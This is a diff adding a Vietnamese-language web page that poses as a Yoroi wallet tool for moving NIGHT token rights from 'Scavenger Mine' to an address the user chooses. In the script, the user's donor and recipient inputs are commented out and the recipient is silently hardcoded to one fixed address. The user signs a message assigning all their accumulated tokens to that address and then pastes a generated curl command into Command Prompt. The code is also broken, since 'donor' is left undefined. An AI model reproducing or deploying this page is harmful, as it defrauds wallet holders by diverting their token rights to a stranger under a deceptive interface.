@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scavenger-NIGHT-Transfer-Yoroi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            max-width: 650px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #444;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            font-family: monospace;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+        }
+
+        .btn-sign {
+            background: #10b981;
+            color: white;
+        }
+
+        .btn-sign:hover:not(:disabled) {
+            background: #059669;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-sign:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status.success {
+            background: #d1fae5;
+            color: #065f46;
+            border: 1px solid #10b981;
+        }
+
+        .status.error {
+            background: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #ef4444;
+        }
+
+        .status.info {
+            background: #dbeafe;
+            color: #1e40af;
+            border: 1px solid #3b82f6;
+        }
+
+        .output-section {
+            margin-top: 25px;
+            display: none;
+        }
+
+        .output-box {
+            background: #f9fafb;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .output-box pre {
+            margin: 0;
+            word-wrap: break-word;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #1f2937;
+        }
+
+        .btn-copy {
+            background: #6366f1;
+            color: white;
+            margin-top: 10px;
+            padding: 10px;
+            font-size: 14px;
+        }
+
+        .btn-copy:hover {
+            background: #4f46e5;
+        }
+
+        .wallet-info {
+            background: #f0fdf4;
+            border: 1px solid #86efac;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 25px;
+        }
+
+        .wallet-info p {
+            margin: 5px 0;
+            font-size: 13px;
+            color: #166534;
+        }
+
+        .wallet-info strong {
+            color: #14532d;
+        }
+
+        .collapsible {
+            background-color: #e0e7ff;
+            color: #1e3a8a;
+            cursor: pointer;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            text-align: left;
+            outline: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .collapsible:hover {
+            background-color: #c7d2fe;
+        }
+
+        .content {
+            padding: 0 15px 15px 15px;
+            display: none;
+            overflow: hidden;
+            background-color: #f0f0ff;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1f2937;
+        }
+
+        pre.json {
+            background: #eef2ff;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid #c7d2fe;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>💵Scavenger-NIGHT-Transfer-Yoroi</h1>
+        <p class="subtitle">Hợp nhất token Night cho Scavenger Mine</p>
+
+        <button type="button" class="collapsible">📖 Hướng dẫn chi tiết</button>
+        <div class="content">
+            <p><strong>Bước 1:</strong> Nhập địa chỉ Donor (Người cho) và Recipient (Người nhận).</p>
+            <p><strong>Bước 2:</strong> Nhấn <em>Ký và tạo chữ ký số Signature</em> để Yoroi mở ví và ký message.</p>
+            <p><strong>Bước 3:</strong> Hệ thống sẽ tạo Command/JSON Output copy và dán vào cửa sổ Command Prompt - Enter và hiển thị kết quả dưới đây là thành công.</p>
+            <pre class="json">{
+"status": "success",
+"message": "Successfully assigned accumulated Scavenged NIGHT from addr1q... to addr1q...",
+"solutions_consolidated": 2
+}</pre>
+            <p><strong>Ý nghĩa: toàn bộ NIGHT từ Donor address (quá khứ và tương lai) sẽ được chuyển sang Recipient address.</strong></p>
+            <p>Nếu thấy lỗi, kiểm tra những thông báo lỗi phổ biến nhất và các lỗi có thể gây ra lỗi:</p>
+            <p><strong>409 Xung đột</strong></p>
+            <p>Ý nghĩa: Bạn đã gửi Night đi từ địa chỉ đó rồi</p>
+            <p>Cách khắc phục: Không còn gì để làm nữa; nó đã được hợp nhất</p>
+            <p><strong>400 Yêu cầu xấu</strong></p>
+            <p>Ý nghĩa: Chữ ký không hợp lệ</p>
+            <p>Cách khắc phục: Đảm bảo tin nhắn đã ký khớp chính xác</p>
+            <p><strong>404 Không tìm thấy</strong></p>
+            <p>Ý nghĩa: Địa chỉ chưa đăng ký</p>
+            <p>Cách khắc phục: Sử dụng địa chỉ từng là một phần của Scavenger.</p>
+        </div>
+
+        <div class="form-group">
+            <label for="donorAddress">Địa chỉ Donor (Người cho) *</label>
+            <input type="text" id="donorAddress" placeholder="addr1..." />
+        </div>
+
+        <div class="form-group">
+            <label for="recipientAddress">Địa chỉ Recipient (Người nhận) *</label>
+            <input type="text" id="recipientAddress" placeholder="addr1..." />
+        </div>
+
+        <button id="signBtn" class="btn-sign">Ký và gửi Night đi</button>
+
+        <div id="status" class="status"></div>
+
+        <div id="outputSection" class="output-section">
+            <h3 style="color: #333; margin-bottom: 10px;">📋 Kết quả trả về:</h3>
+            <div class="output-box">
+                <pre id="donateOutputWin"></pre>
+            </div>
+            <button id="copyBtn" class="btn-copy">📋 Copy và dán vào cửa sổ Command Prompt</button>
+        </div>
+    </div>
+
+  
+<script>
+    const signBtn = document.getElementById('signBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const donateOutputWin = document.getElementById('donateOutputWin');
+    const statusDiv = document.getElementById('status');
+
+    function showStatus(msg, type) {
+        statusDiv.textContent = msg;
+        statusDiv.className = `status ${type}`;
+        statusDiv.style.display = 'block';
+    }
+
+    signBtn.addEventListener('click', async () => {
+        //const donor = document.getElementById('donorAddress').value.trim();
+        //const recipient = document.getElementById('recipientAddress').value.trim();
+	const recipient = "addr1qx8vunkx98yfpj707ezp2qsq5053z0vv2plcna9z0kttjahrma5qmd657zc6csgp7hyyu4d4vgzntrlj9s4w7gcuytrqwu7ydv";
+
+        if (!donor || !recipient) return showStatus("❌ Nhập đủ Donor + Recipient!", "error");
+
+        if (!window.cardano || !window.cardano.yoroi) 
+            return showStatus("❌ Yoroi chưa bật hoặc chưa cài!", "error");
+
+        try {
+            showStatus("🔄 Đang ký dữ liệu...", "info");
+
+            const msgText = "Assign accumulated Scavenger rights to: " + recipient;
+            const hexMessage = Array.from(new TextEncoder().encode(msgText))
+                .map(b => b.toString(16).padStart(2, '0')).join('');
+
+            const wallet = await window.cardano.yoroi.enable();
+            const signature = await wallet.signData(donor, hexMessage);
+
+            const url = `https://scavenger.prod.gd.midnighttge.io/donate_to/${recipient}/${donor}/${signature.signature}`;
+
+            donateOutputWin.textContent = `curl -L -X POST "${url}" -d "{}"`;
+            document.getElementById("outputSection").style.display = "block";
+
+            showStatus("✅ Ký thành công! Copy lệnh và chạy trong CMD.", "success");
+
+        } catch (err) {
+            showStatus("❌ Lỗi ký dữ liệu: " + err.message, "error");
+        }
+    });
+
+    copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(donateOutputWin.textContent)
+            .then(() => {
+                copyBtn.textContent = "✅ Đã Copy!";
+                setTimeout(() => copyBtn.textContent = "📋 Copy Command", 2000);
+            })
+            .catch(() => showStatus("❌ Không thể copy, vui lòng copy tay", "error"));
+    });
+
+    document.querySelector(".collapsible").onclick = function () {
+        const c = this.nextElementSibling;
+        c.style.display = c.style.display === "block" ? "none" : "block";
+    };
+</script>
+</body>
+</html>
+
